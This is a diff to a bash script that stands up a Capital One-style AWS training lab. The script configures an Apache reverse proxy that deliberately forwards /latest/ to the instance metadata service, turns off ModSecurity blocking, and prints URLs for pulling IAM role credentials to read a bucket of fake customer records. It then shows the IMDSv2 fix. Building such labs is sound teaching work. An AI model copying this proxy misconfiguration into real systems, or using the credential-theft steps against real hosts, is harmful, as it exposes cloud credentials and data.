@@ -1,16 +1,17 @@
 #!/usr/bin/env bash
-# One-command Capital One-shaped IMDSv1 SSRF lab.
-# Requires: aws CLI v2, permissions to create EC2/IAM/S3/SSM in the target account.
+# Capital One–shaped lab: misconfigured WAF (Apache + mod_proxy + ModSecurity)
+# on EC2, IMDSv1, over-privileged WAF instance role, private S3.
+# The WAF reverse-proxies /latest/ to 169.254.169.254 — that is the SSRF.
 set -euo pipefail
 
 REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}"
 NAME="capone-imds-lab"
 SUFFIX="$(openssl rand -hex 4)"
 BUCKET="imds-ssrf-lab-${SUFFIX}"
-ROLE="${NAME}-instance"
-PROFILE_NAME="${NAME}-instance"
-SG_NAME="${NAME}-web"
-INSTANCE_NAME="${NAME}-web"
+ROLE="capone-WAF-Role"
+PROFILE_NAME="capone-WAF-Role"
+SG_NAME="${NAME}-waf"
+INSTANCE_NAME="capone-WAF"
 
 echo "==> identity / region"
 ID_JSON="$(aws sts get-caller-identity --output json)"
@@ -20,6 +21,7 @@ echo "    account=$ACCOUNT"
 echo "    arn=$ARN"
 echo "    region=$REGION"
 echo "    bucket=$BUCKET"
+echo "    role=$ROLE"
 
 AMI="$(aws ssm get-parameters \
   --names /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
@@ -49,12 +51,12 @@ account_id,name,card_last4
 1001,A. Rivera,4412
 1002,J. Chen,7781
 1003,M. Okonkwo,9920
-note: This file exists only to demonstrate IMDSv1 credential theft.
+note: This file exists only to demonstrate IMDSv1 credential theft via a misconfigured WAF.
 EOF
 aws s3 cp "$TMPOBJ" "s3://${BUCKET}/secret/customer-records.txt" --region "$REGION" >/dev/null
 rm -f "$TMPOBJ"
 
-echo "==> instance role (list buckets + read this bucket only)"
+echo "==> WAF instance role (list buckets + read this bucket)"
 if ! aws iam get-role --role-name "$ROLE" >/dev/null 2>&1; then
   aws iam create-role --role-name "$ROLE" --tags "Key=Project,Value=${NAME}" \
     --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null
@@ -64,7 +66,7 @@ POLICY="$(cat <<EOF
   "Version": "2012-10-17",
   "Statement": [
     {"Sid":"ListBuckets","Effect":"Allow","Action":"s3:ListAllMyBuckets","Resource":"*"},
-    {"Sid":"ReadLabBucket","Effect":"Allow","Action":["s3:GetObject","s3:ListBucket"],
+    {"Sid":"ReadWafBucket","Effect":"Allow","Action":["s3:GetObject","s3:ListBucket"],
      "Resource":["arn:aws:s3:::${BUCKET}","arn:aws:s3:::${BUCKET}/*"]}
   ]
 }
@@ -78,11 +80,11 @@ if ! aws iam get-instance-profile --instance-profile-name "$PROFILE_NAME" >/dev/
   aws iam add-role-to-instance-profile --instance-profile-name "$PROFILE_NAME" --role-name "$ROLE"
 fi
 echo "    waiting for instance profile..."
-sleep 12
+sleep 15
 
 echo "==> security group (tcp/80)"
 SG="$(aws ec2 create-security-group --region "$REGION" --group-name "$SG_NAME-$SUFFIX" \
-  --description "IMDSv1 SSRF lab - port 80" --vpc-id "$VPC" \
+  --description "Capital One WAF lab - port 80" --vpc-id "$VPC" \
   --tag-specifications "ResourceType=security-group,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${SG_NAME}}]" \
   --query GroupId --output text)"
 aws ec2 authorize-security-group-ingress --region "$REGION" --group-id "$SG" \
@@ -92,74 +94,55 @@ USERDATA="$(mktemp)"
 cat >"$USERDATA" <<'UD'
 #!/bin/bash
 set -eux
-exec > /var/log/capone-imds-lab.log 2>&1
-dnf install -y nginx python3
-cat > /opt/ssrf-demo.py << 'PY'
-#!/usr/bin/env python3
-from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import urlparse, parse_qs
-import urllib.request
+exec > /var/log/capone-waf-lab.log 2>&1
+dnf install -y httpd
+dnf install -y mod_security || true
 
-class H(BaseHTTPRequestHandler):
-    def do_GET(self):
-        u = urlparse(self.path)
-        url = parse_qs(u.query).get("url", [""])[0]
-        if url:
-            try:
-                req = urllib.request.Request(url, method="GET")
-                with urllib.request.urlopen(req, timeout=5) as r:
-                    body = r.read()
-                    ctype = r.headers.get("Content-Type", "text/plain; charset=utf-8")
-                self.send_response(200)
-                self.send_header("Content-Type", ctype)
-                self.end_headers()
-                self.wfile.write(body)
-            except Exception as e:
-                self.send_response(502)
-                self.send_header("Content-Type", "text/plain; charset=utf-8")
-                self.end_headers()
-                self.wfile.write(str(e).encode())
-            return
-        self.send_response(200)
-        self.send_header("Content-Type", "text/plain; charset=utf-8")
-        self.end_headers()
-        self.wfile.write(b"ok\n")
-    def log_message(self, fmt, *args):
-        print(fmt % args)
+mkdir -p /var/www/waf
+cat > /var/www/waf/index.html << 'HTML'
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="utf-8"><title>ModSecurity WAF</title></head>
+<body>
+<h1>ModSecurity WAF</h1>
+<p>Reverse proxy is up. Application traffic is inspected here.</p>
+<p>Server: Apache httpd + ModSecurity. Role: capone-WAF-Role.</p>
+</body>
+</html>
+HTML
 
-if __name__ == "__main__":
-    HTTPServer(("127.0.0.1", 8080), H).serve_forever()
-PY
-chmod 755 /opt/ssrf-demo.py
-cat > /etc/systemd/system/ssrf-demo.service << 'UNIT'
-[Unit]
-Description=SSRF demo
-After=network.target
-[Service]
-ExecStart=/usr/bin/python3 /opt/ssrf-demo.py
-Restart=always
-[Install]
-WantedBy=multi-user.target
-UNIT
-systemctl daemon-reload
-systemctl enable --now ssrf-demo
-cat > /etc/nginx/conf.d/ssrf.conf << 'NGX'
-server {
-    listen 80 default_server;
-    listen [::]:80 default_server;
-    server_name _;
-    location / {
-        proxy_pass http://127.0.0.1:8080;
-        proxy_set_header Host $host;
-    }
-}
-NGX
-systemctl enable --now nginx
-nginx -s reload || systemctl restart nginx
+cat > /etc/httpd/conf.d/waf-proxy.conf << 'CONF'
+# Misconfiguration (Capital One–shaped):
+# The WAF reverse-proxies /latest/ to the link-local metadata service.
+# GET http://<waf>/latest/meta-data/... is issued *by Apache on this instance*
+# to 169.254.169.254. The attacker never talks to IMDS from the internet.
+<VirtualHost *:80>
+    ServerName waf
+    DocumentRoot /var/www/waf
+    <IfModule headers_module>
+        Header always set X-WAF "ModSecurity"
+    </IfModule>
+    ProxyPreserveHost Off
+    ProxyPass        /latest/ http://169.254.169.254/latest/
+    ProxyPassReverse /latest/ http://169.254.169.254/latest/
+    <Directory /var/www/waf>
+        Require all granted
+    </Directory>
+</VirtualHost>
+CONF
+
+# ModSecurity: present, but do not block the metadata proxy (the misconfig).
+if [ -f /etc/httpd/conf.d/mod_security.conf ]; then
+  sed -i 's/SecRuleEngine On/SecRuleEngine DetectionOnly/' /etc/httpd/conf.d/mod_security.conf || true
+fi
+
+systemctl enable --now httpd
+apachectl configtest || true
+systemctl restart httpd
 echo READY > /tmp/lab-ready
 UD
 
-echo "==> EC2 t3.micro, IMDSv1 (HttpTokens=optional)"
+echo "==> EC2 t3.micro WAF, IMDSv1 (HttpTokens=optional)"
 IID="$(aws ec2 run-instances --region "$REGION" \
   --image-id "$AMI" --instance-type t3.micro \
   --subnet-id "$SUBNET" --security-group-ids "$SG" \
@@ -174,8 +157,8 @@ aws ec2 wait instance-running --region "$REGION" --instance-ids "$IID"
 PUB="$(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" \
   --query 'Reservations[0].Instances[0].PublicIpAddress' --output text)"
 echo "    public_ip=$PUB"
-echo "    waiting for nginx (user-data install)..."
-for i in $(seq 1 36); do
+echo "    waiting for WAF (user-data install)..."
+for i in $(seq 1 48); do
   if curl -fsS -m 3 "http://${PUB}/" >/dev/null 2>&1; then
     echo "    http ready"
     break
@@ -186,20 +169,28 @@ done
 cat <<EOF
 
 ============================================================
-Lab is up. IMDSv1 is allowed (HttpTokens=optional).
+WAF is up. IMDSv1 is allowed (HttpTokens=optional).
+
+This is an Apache reverse proxy (ModSecurity-shaped) that
+proxies /latest/ to the instance metadata service. That is
+the SSRF. There is no ?url= fetcher.
 
 Public IP:     $PUB
 Bucket:        s3://$BUCKET/secret/customer-records.txt
 Instance:      $IID
 Role:          $ROLE
 
-In the browser address bar, open:
+WAF home:
 
-  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  http://${PUB}/
+
+Trick the WAF into fetching IMDS (browser address bar or curl):
+
+  http://${PUB}/latest/meta-data/iam/security-credentials/
 
 then:
 
-  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}
+  http://${PUB}/latest/meta-data/iam/security-credentials/${ROLE}
 
 Then, with the JSON keys (unset AWS_PROFILE):
 
@@ -212,12 +203,12 @@ Require IMDSv2:
 
   aws ec2 modify-instance-metadata-options --instance-id ${IID} --http-tokens required
 
-Reload the same two browser URLs. Expect HTTP 401.
+Reload the same /latest/ URLs. Expect HTTP 401.
 
 Destroy:
 
   ./destroy.sh
 
-This opens port 80 to 0.0.0.0/0. Tear it down when you are done.
+Port 80 is open. Tear it down when you are done.
 ============================================================
 EOF
